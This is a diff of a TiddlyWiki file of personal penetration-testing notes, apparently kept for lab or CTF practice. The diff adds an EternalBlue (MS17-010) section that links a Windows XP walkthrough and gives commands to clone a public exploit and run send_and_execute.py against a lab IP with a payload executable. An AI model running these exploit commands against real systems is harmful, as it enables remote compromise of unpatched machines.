@@ -9680,7 +9680,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211027132533945" list="[[Cyber Security]] [[Penetration Testing Framework]] [[Privilege Escalation]] [[Privesc - Linux Binaries]] Tech CrappyMakerProgrammer" modified="20211027143515114" title="$:/StoryList">
+<div created="20211027132533945" list="[[Cyber Security]] [[Penetration Testing Framework]] [[Common Vulnerabilities and Exposures]] [[Privilege Escalation]] Tech CrappyMakerProgrammer" modified="20211027144111241" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10404,7 +10404,7 @@ Environment Carry Over
 # Bash Functions
 </pre>
 </div>
-<div created="20211010080834792" modified="20211027133726650" title="Common Vulnerabilities and Exposures">
+<div created="20211010080834792" modified="20211027145818868" title="Common Vulnerabilities and Exposures">
 <pre>! Researching for Popular Exploits
 
 ```
@@ -10417,7 +10417,17 @@ searchsploit -m &lt;ID&gt; # Makes a local copy in the current directory
 
 !! Eternal Blue
 
+!!! Windows XP SP3
+https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/ 
 
+```
+git clone https://github.com/helviojunior/MS17-010
+python send_and_execute.py 10.10.10.4 ../ms17-010.exe
+```
+
+!!! Others
+
+Just searchsploit.
 
 !! Microsoft IIS 6.0 WebDAV Exploit
 
